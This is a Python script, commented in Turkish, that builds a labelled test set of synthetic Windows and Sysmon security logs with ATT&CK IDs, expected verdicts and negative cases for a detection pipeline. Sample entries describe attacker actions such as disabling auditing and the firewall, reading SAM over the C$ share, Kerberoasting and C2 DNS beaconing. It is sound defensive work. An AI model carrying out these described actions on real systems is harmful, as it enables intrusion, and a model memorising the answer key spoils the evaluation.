        "attack_source": "T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting (v19.1)",
    },
    {
        "id": "S-ID-07", "event_id": "4719",
        "input": ("System audit policy was changed.  Subject:  Security ID:  "
                  "WINHOST-01\\jdoe  Audit Policy Change:  Category:  Object Access  "
                  "Subcategory:  Registry  Subcategory GUID:  "
                  "{0CCE921E-69AE-11D9-BED3-505054503030}  Changes:  Success removed"),
        "expected_attack_ids": ["T1685.001"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Registry denetiminin KAPATILMASI -- sonraki kanitlari yok eder. "
                     "Yon onemli: 'Success removed'.",
        "attack_source": "T1685.001 Disable or Modify Windows Event Log (v19.1; T1562.002 REVOKED)",
    },
    {
        "id": "S-ID-08", "event_id": "5025",
        "input": ("The Windows Firewall service has been stopped.  "
                  "Subject:  Security ID:  WINHOST-01\\jdoe"),
        "expected_attack_ids": ["T1686"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Guvenlik duvari servisinin durdurulmasi -- kontrolun BOZULMASI. "
                     "Polarite: durduruldu, izin verildi degil.",
        "attack_source": "T1686 Disable or Modify System Firewall (v19.1; T1562.004 REVOKED)",
    },
    {
        "id": "S-ID-09", "event_id": "4950",
        "input": ("A Windows Defender Firewall setting has changed.  Profile:  Public  "
                  "Setting Type:  Firewall enabled  Value:  No  Subject:  Security ID:  "
                  "WINHOST-01\\jdoe"),
        "expected_attack_ids": ["T1686"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Guvenlik duvarinin profil bazinda kapatilmasi.",
        "attack_source": "T1686 Disable or Modify System Firewall (v19.1; T1562.004 REVOKED)",
    },
    {
        "id": "S-ID-10", "event_id": "4946",
        "input": ("A change has been made to Windows Firewall exception list. A rule "
                  "was added.  Profile Changed:  All  Rule Name:  AllowRDP  Rule ID:  "
                  "{a1b2c3d4-0000-0000-0000-000000000001}  Rule Port:  3389"),
        "expected_attack_ids": ["T1686"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": True,
        "rationale": "RDP'yi disariya acan kural eklendi. G'de bu ID hic yoktu -- "
                     "eski sistemin T1686.003'u 5156'dan uydurmasinin kok sebebi.",
        "attack_source": "T1686 Disable or Modify System Firewall (v19.1; T1562.004 REVOKED)",
    },
    {
        "id": "S-ID-11", "event_id": "5140",
        "input": ("A network share object was accessed.  Subject:  Security ID:  "
                  "CORP\\jdoe  Account Name:  jdoe  Network Information:  Object Type:  "
                  "File  Source Address:  10.0.0.55  Share Name:  \\\\*\\ADMIN$  "
                  "Share Path:  \\??\\C:\\Windows"),
        "expected_attack_ids": ["T1021.002"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "ADMIN$ yonetimsel paylasimina erisim -- yanal hareket.",
        "attack_source": "T1021.002 Remote Services: SMB/Windows Admin Shares (v19.1)",
    },
    {
        "id": "S-ID-12", "event_id": "5145",
        "input": ("A network share object was checked to see whether client can be "
                  "granted desired access.  Subject:  Security ID:  CORP\\jdoe  "
                  "Network Information:  Share Name:  \\\\*\\C$  Share Path:  \\??\\C:\\  "
                  "Relative Target Name:  Windows\\System32\\config\\SAM  "
                  "Access Request Information:  Accesses:  ReadData (or ListDirectory)"),
        "expected_attack_ids": ["T1003.002"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "C$ uzerinden SAM dosyasina erisim denemesi -- kimlik hirsizligi "
                     "ag uzerinden.",
        "attack_source": "T1003.002 Security Account Manager (v19.1)",
    },
    {
        "id": "S-ID-13", "event_id": "7040",
        "input": ("The start type of the Windows Event Log service was changed from "
                  "auto start to disabled."),
        "expected_attack_ids": ["T1685.001"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Olay gunlugu servisinin devre disi birakilmasi. Yon kanittir: "
                     "auto -> disabled.",
        "attack_source": "T1685.001 Disable or Modify Windows Event Log (v19.1; T1562.002 REVOKED)",
    },
    {
        "id": "S-ID-14", "event_id": "22",
        "input": ("Dns query:  RuleName: -  UtcTime: 2026-08-31 09:22:31.004  "
                  "ProcessId: 7712  QueryName: c2.example-malware.net  QueryStatus: 0  "
                  "QueryResults: ::ffff:198.51.100.7;  Image: C:\\Users\\Public\\u.exe"),
        "expected_attack_ids": ["T1071.004"], "expected_decision": SUSPICIOUS,
        "negative_case": False, "review_flag": False,
        "rationale": "Kullanici yazilabilir konumdaki ikilinin DNS sorgusu -- C2 kanali.",
        "attack_source": "T1071.004 Application Layer Protocol: DNS (v19.1)",
    },
]


# --- BLOK 6: negatif ornekler (12) ---------------------------------------
# Yanlis alarm orani olculebilsin diye. Hepsi gercek ortamlarda her gun
# gorulen kayitlar.

LOGLAR += [
    {
        "id": "S-N-01", "event_id": "5156",
        "input": ("The Windows Filtering Platform has permitted a connection.  "
                  "Application Information:  Process ID:  23356  Application Name:  "
                  "\\device\\harddiskvolume3\\program files\\google\\chrome\\application"
                  "\\chrome.exe  Network Information:  Direction:  Outbound  "
                  "Source Address:  198.51.100.185  Source Port:  59902  "
                  "Destination Address:  142.250.187.14  Destination Port:  443  "
                  "Protocol:  6"),
        "expected_attack_ids": [], "expected_decision": INSUFFICIENT,
        "negative_case": True, "review_flag": False,
        "rationale": "POLARITE TUZAGI: 'permitted a connection' kontrolun CALISTIGINI "
                     "soyler, bozuldugunu degil. Eski sistem tam bu satirlardan "
                     "T1686.003 uretmisti (qradar 51 satir regresyonu).",
        "attack_source": "Windows 5156 tanimi; app/mapping/polarity.py",
    },
    {
        "id": "S-N-02", "event_id": "4624",
        "input": ("An account was successfully logged on.  Subject:  Security ID:  "
                  "NULL SID  New Logon:  Security ID:  WINHOST-01\\jdoe  Account Name:  "
                  "jdoe  Logon Type:  2  Logon Process:  User32  Authentication "
                  "Package:  Negotiate  Workstation Name:  WINHOST-01"),
        "expected_attack_ids": [], "expected_decision": INSUFFICIENT,
        "negative_case": True, "review_flag": False,
        "rationale": "Etkilesimli (tip 2) basarili oturum acma -- gunun en sik kaydi. "
                     "'NULL SID' burada yokluk degil, normal bir Subject degeri.",
        "attack_source": "Windows 4624 Logon Type 2 tanimi",
    },
    {
        "id": "S-N-03", "event_id": "4625",
        "input": ("An account failed to log on.  Subject:  Security ID:  NULL SID  "
                  "Account For Which Logon Failed:  Account Name:  jdoe  Failure "
                  "Information:  Failure Reason:  Unknown user name or bad password.  "
                  "Status:  0xC000006D  Sub Status:  0xC000006A  Logon Type:  2"),
        "expected_attack_ids": [], "expected_decision": INSUFFICIENT,
        "negative_case": True, "review_flag": False,
        "rationale": "TEK basarisiz oturum acma yanlis yazilmis paroladir. Kaba kuvvet "
                     "iddiasi icin SAYI ve ZAMAN penceresi gerekir; tek satir bunu vermez.",
        "attack_source": "Windows 4625 tanimi",
    },
    {
        "id": "S-N-04", "event_id": "4663",
        "input": _4663("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services"
                       "\\W32Time\\Config", "LOCAL SERVICE",
                       "C:\\Windows\\System32\\svchost.exe"),
        "expected_attack_ids": [], "expected_decision": INSUFFICIENT,
        "negative_case": True, "review_flag": False,
        "rationale": "GERCEKLESEN yazma ama anahtar `noise` (time-service). Kritiklik "
                     "esigi tutmadigi icin Yol B atesLENMEMELI -- erisim gerceklesse bile.",
        "attack_source": "config/asset_criticality.yaml time-service / noise",
    },
    {
        "id": "S-N-05", "event_id": "4688",
        "input": _4688("SYSTEM", "C:\\Windows\\System32\\msiexec.exe",
                       "C:\\Windows\\System32\\services.exe",
                       "C:\\Windows\\System32\\msiexec.exe /V"),
        "expected_attack_ids": [], "expected_decision": INSUFFICIENT,
        "negative_case": True, "review_flag": False,
        "rationale": "Windows Installer servis modunda basliyor; her kurulumda gorulur.",
        "attack_source": "Windows Installer servis modu (/V)",
    },
    {
        "id": "S-N-06", "event_id": "7045",
        "input": ("A service was installed in the system.  Service Name:  "
                  "Npcap Packet Driver  Service File Name:  "
                  "C:\\Windows\\System32\\drivers\\npcap.sys  Service Type:  "
                  "kernel mode driver  Service Start Type:  demand start  "
                  "Service Account:  "),
        "expected_attack_ids": [], "expected_decision": INSUFFICIENT,
        "negative_case": True, "review_flag": True,
        "rationale": "Mesru surucu kurulumu -- System32\\drivers konumunda ve talep "
                     "uzerine basliyor. S-A-06 ile TEK farki konum ve baslatma turu; "
                     "bu cift 7045'in kendisinin kanit olmadigini olcer.",
        "attack_source": "Npcap surucusu; 7045 tanimi",
    },
    {
        "id": "S-N-07", "event_id": "4657",
        "input": _4657("\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT"
                       "\\CurrentVersion\\ProductName",
                       "ProductName", "Windows 11 Pro", "Windows 11 Pro",
                       "C:\\Windows\\servicing\\TrustedInstaller.exe", "SYSTEM"),
        "expected_attack_ids": [], "expected_decision": BENIGN,
        "negative_case": True, "review_flag": False,
        "rationale": "Isletim sistemi surum adinin yeniden yazilmasi (os-version / "
                     "noise), aktor TrustedInstaller. Yama isleminin normal izi.",
        "attack_source": "config/asset_criticality.yaml os-version / noise",
    },
    {
        "id": "S-N-08", "event_id": "4769",
        "input": ("A Kerberos service ticket was requested.  Account Information:  "
                  "Account Name:  jdoe@CORP.LOCAL  Service Information:  Service Name:  "
                  "WINHOST-01$  Network Information:  Client Address:  ::ffff:10.0.0.55  "
                  "Additional Information:  Ticket Options:  0x40810000  "
                  "Ticket Encryption Type:  0x12"),
        "expected_attack_ids": [], "expected_decision": INSUFFICIENT,
        "negative_case": True, "review_flag": False,
        "rationale": "AES (0x12) sifrelemeli normal bilet talebi. S-ID-06 ile TEK farki "
                     "sifreleme turu -- kerberoasting sinyalinin RC4'e bagli oldugunu olcer.",
        "attack_source": "Windows 4769 Ticket Encryption Type tanimi",
    },
    {
        "id": "S-N-09", "event_id": "5145",
        "input": ("A network share object was checked to see whether client can be "
                  "granted desired access.  Subject:  Security ID:  CORP\\jdoe  "
                  "Network Information:  Share Name:  \\\\*\\Departman  Share Path:  "
                  "\\??\\D:\\Paylasim\\Departman  Relative Target Name:  "
                  "2026\\butce.xlsx  Access Request Information:  Accesses:  ReadData "
                  "(or ListDirectory)"),
        "expected_attack_ids": [], "expected_decision": INSUFFICIENT,
        "negative_case": True, "review_flag": False,
        "rationale": "Sira disi olmayan dosya paylasimi erisimi. S-ID-12 ile ayni olay "
                     "ID, farkli hedef -- kanit paylasimda degil HEDEFTE.",
        "attack_source": "Windows 5145 tanimi",
    },
    {
        "id": "S-N-10", "event_id": "3",
        "input": ("Network connection detected:  RuleName: -  UtcTime: 2026-08-31 "
                  "09:25:11.887  ProcessId: 4180  Image: C:\\Program Files\\Google\\Chrome"
                  "\\Application\\chrome.exe  User: WINHOST-01\\jdoe  Protocol: tcp  "
                  "SourceIp: 198.51.100.185  DestinationIp: 142.250.187.14  "
                  "DestinationPort: 443  DestinationHostname: www.google.com"),
        "expected_attack_ids": [], "expected_decision": INSUFFICIENT,
        "negative_case": True, "review_flag": False,
        "rationale": "Tarayicinin normal HTTPS baglantisi. S-ID-14 ile ayni eksen, "
                     "farkli surec ve hedef.",
        "attack_source": "Sysmon Event ID 3 tanimi",
    },
    {
        "id": "S-N-11", "event_id": "4104",
        "input": ("Creating Scriptblock text (1 of 1):  "
                  "Get-Process | Where-Object {$_.CPU -gt 100} | Sort-Object CPU "
                  "-Descending | Select-Object -First 10  "
                  "ScriptBlock ID: 1a2b3c4d-5e6f-7081-92a3-b4c5d6e7f809  Path:"),
        "expected_attack_ids": [], "expected_decision": INSUFFICIENT,
        "negative_case": True, "review_flag": False,
        "rationale": "Zararsiz tani script'i. 4104'un kendisi kanit degildir -- ICERIK "
                     "kanittir. S-A-05 ile cift olusturur.",
        "attack_source": "Windows PowerShell 4104 ScriptBlock tanimi",
    },
    {
        "id": "S-N-12", "event_id": "4672",
        "input": ("Special privileges assigned to new logon.  Subject:  Security ID:  "
                  "NT AUTHORITY\\SYSTEM  Account Name:  SYSTEM  Account Domain:  "
                  "NT AUTHORITY  Logon ID:  0x3E7  Privileges:  SeAssignPrimaryTokenPrivilege  "
                  "SeTcbPrivilege  SeSecurityPrivilege  SeTakeOwnershipPrivilege"),
        "expected_attack_ids": [], "expected_decision": INSUFFICIENT,
        "negative_case": True, "review_flag": False,
        "rationale": "SYSTEM her acilista bu ayricaliklari alir. Ayricalikli gorunen "
                     "ama tamamen rutin olan kayit.",
        "attack_source": "Windows 4672 tanimi",
    },
]


def main() -> int:
    # --- Govdeleri toplayici zarfina sar (bkz. _zarf) ----------------------
    # Kayitlar okunabilir kalsin diye govde olarak yazildi; zarf TEK yerde
    # ve TEK bicimde uygulaniyor -- 60 kayda elle yazilsa 60 kopya olurdu.
    for _sira, _k in enumerate(LOGLAR, start=1):
        _k["input"] = _zarf(_sira, _k["event_id"], _k["input"])

    # --- ATT&CK v19.1 dogrulamasi (H kolunda iki gecersiz ID yakalamisti) --
    kb = AttackKnowledgeBase().by_id
    for kayit in LOGLAR:
        for tid in kayit["expected_attack_ids"]:
            t = kb.get(tid)
            if t is None:
                raise SystemExit(f"{kayit['id']}: {tid} v19.1 bundle'inda YOK")
            if t["revoked"]:
                raise SystemExit(
                    f"{kayit['id']}: {tid} REVOKED -> {t.get('revoked_by')}"
                )

    # --- B1 sozlesmesi: uc cift, her ciftin iki yarisinin karari FARKLI ---
    ciftler: dict[str, dict[str, dict]] = collections.defaultdict(dict)
    for k in LOGLAR:
        if k.get("b1_pair"):
            ciftler[k["b1_pair"]][k["b1_half"]] = k
    if len(ciftler) < 3:
        raise SystemExit(f"B1: uc ayri kritik anahtar gerekli, {len(ciftler)} var")
    for ad, yarim in sorted(ciftler.items()):
        if set(yarim) != {"A", "B"}:
            raise SystemExit(f"B1 {ad}: iki yarim da gerekli, {sorted(yarim)} var")
        if yarim["A"]["expected_decision"] == yarim["B"]["expected_decision"]:
            raise SystemExit(
                f"B1 {ad}: iki yarinin beklenen karari AYNI -- ayirt etme gucunu olcemez"
            )
        if yarim["A"]["event_id"] != "4656":
            raise SystemExit(f"B1 {ad}: A yarisi 4656 olmali")
        if yarim["B"]["event_id"] not in ("4663", "4657"):
            raise SystemExit(f"B1 {ad}: B yarisi 4663/4657 olmali")

    # --- EK-2 sozlesmesi: beklenen cift TABLOYLA eslesmek ZORUNDA ----------
    # Bu kontrol hafizaya degil config'in KENDISINE bakiyor. Ilk yazimda
    # beklenen cift kayitlari makine hesabiyla (WINHOST-01$) yazilmisti;
    # tablo `hesaplar: [system, ...]` istiyor, yani bastirma tetiklenmez ve
    # BENIGN beklentisi olculen seyle ILGISIZ bir sebepten tutmazdi.
    import yaml  # noqa: PLC0415 -- yalnizca dogrulama icin

    tablo = yaml.safe_load(
        (KOK / "config" / "actor_baseline.yaml").read_text(encoding="utf-8"))
    izinli_surec, izinli_hesap = set(), set()
    for cift in tablo.get("beklenen_ciftler") or []:
        izinli_surec |= {s.lower() for s in cift.get("surecler") or []}
        izinli_hesap |= {h.lower() for h in cift.get("hesaplar") or []}

    beklenen_cift_kayitlari = [k for k in LOGLAR
                               if k["id"] in ("S-EK2-01", "S-EK2-02")]
    if len(beklenen_cift_kayitlari) != 2:
        raise SystemExit("EK-2: beklenen cift kayitlari bulunamadi")
    for k in beklenen_cift_kayitlari:
        govde = k["input"]
        surec_var = any(f"\\{s}" in govde.lower() for s in izinli_surec)
        hesap_var = any(f"account name:  {h}" in govde.lower() for h in izinli_hesap)
        if not (surec_var and hesap_var):
            raise SystemExit(
                f"{k['id']}: BEKLENEN cift actor_baseline.yaml ile eslesmiyor "
                f"(surec={surec_var}, hesap={hesap_var}). Tablo surec VE hesap "
                "eslesmesi ister; eslesmezse bastirma tetiklenmez ve BENIGN "
                "beklentisi yanlis sebeple tutmaz."
            )

    # --- DOZ SINIRI: 4656 + yazma maskesi + kritik anahtar = yalniz 3 kayit -
    doz = [k for k in LOGLAR
           if k["event_id"] == "4656" and YAZMA_MASKESI in k["input"]]
    if len(doz) != 3:
        raise SystemExit(
            f"DOZ SINIRI ihlali: bilinen yanlis alarm ucluSU {len(doz)} kayitta "
            "(beklenti §4: tam olarak 3). Serbest birakilirsa S'in yanlis alarm "
            "orani sistemi degil o tek kusurun sikligini olcer."
        )

    idler = sorted({k["id"] for k in LOGLAR})
    if len(idler) != len(LOGLAR):
        raise SystemExit("Yinelenen kayit id'si var")

    dagilim: dict[str, int] = {}
    for k in LOGLAR:
        dagilim[k["expected_decision"]] = dagilim.get(k["expected_decision"], 0) + 1
    negatif = sum(1 for k in LOGLAR if k["negative_case"])

    CIKTI.write_text(
        json.dumps(
            {
                "_beklenti": "docs/beklenti_13_s_kolu.md",
                "_yazilma_ani": (
                    "G kolu kosulduktan SONRA, S hic calistirilmadan once "
                    "(2026-08-31). Beklenen cevaplar ATT&CK korpusundan ve "
                    "Windows olay tanimlarindan yazildi; sistemin ciktisina "
                    "BAKILMADI."
                ),
                "_bilinen_kusur": (
                    "4656 + yazma maskesi + kritik anahtar ucluSU BILINEN bir "
                    "yanlis alarm kaynagidir (Gorev 16). Bu sette DOZU 3 "
                    "kayitla sinirlidir; S'teki orani sistemin ayirt etme gucu "
                    "degil, bu bilinen kusurun sikligidir."
                ),
                "_uretici": "scripts/build_s_arm_set.py",
                "attack_version": "19.1",
                "kayit_sayisi": len(LOGLAR),
                "karar_dagilimi": dagilim,
                "negatif_ornek": negatif,
                "b1_cift_sayisi": len(ciftler),
                "kayitlar": [
                    {**k, "attack_version": "19.1",
                     "labeled_without_running_pipeline": True}
                    for k in LOGLAR
                ],
            },
            ensure_ascii=False,
            indent=1,
        ),
        encoding="utf-8",
    )

    olay_idler = sorted({k["event_id"] for k in LOGLAR}, key=lambda x: (len(x), x))
    print(f"{len(LOGLAR)} sentetik log yazildi -> {CIKTI.relative_to(KOK)}")
    print(f"  karar dagilimi : {dagilim}")
    print(f"  negatif ornek  : {negatif}/{len(LOGLAR)} "
          f"(%{100 * negatif // len(LOGLAR)}, gereken >=%20)")
    print(f"  olay ID        : {len(olay_idler)} essiz {olay_idler}")
    print(f"  B1 cifti       : {len(ciftler)} ayri kritik anahtar, "
          "her ciftin iki yarisinin karari FARKLI")
    print(f"  doz siniri     : 4656+yazma maskesi+kritik anahtar = {len(doz)} kayit (tam 3)")
    print("  ATT&CK         : tum ID'ler v19.1'de var ve revoked degil")
    print("\n  SONRAKI ADIM: measure_heldout_baseline.py --set ile kriterler sinanir.")
    print("  Hat, beklenen cevaplar COMMIT'LENDIKTEN sonra kosulur.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
